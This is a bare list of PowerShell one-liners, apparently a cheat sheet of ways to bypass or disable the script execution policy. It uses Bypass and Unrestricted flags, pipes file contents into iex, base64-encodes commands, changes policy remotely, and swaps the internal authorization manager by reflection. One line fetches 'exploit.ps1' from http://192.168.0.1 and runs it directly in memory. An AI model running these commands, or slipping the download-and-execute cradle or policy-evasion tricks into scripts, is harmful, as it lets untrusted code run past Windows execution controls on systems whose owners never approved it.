powershell.exe -ExecutionPolicy Bypass
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA

Set-ExecutionPolicy Bypass -Scope Process
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
Get-Content .runme.ps1 | Invoke-Expression
GC .runme.ps1 | iex
TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.0.1/exploit.ps1')"
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
Powershell -c "Write-Host 'My voice is my passport, verify me.'"
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1
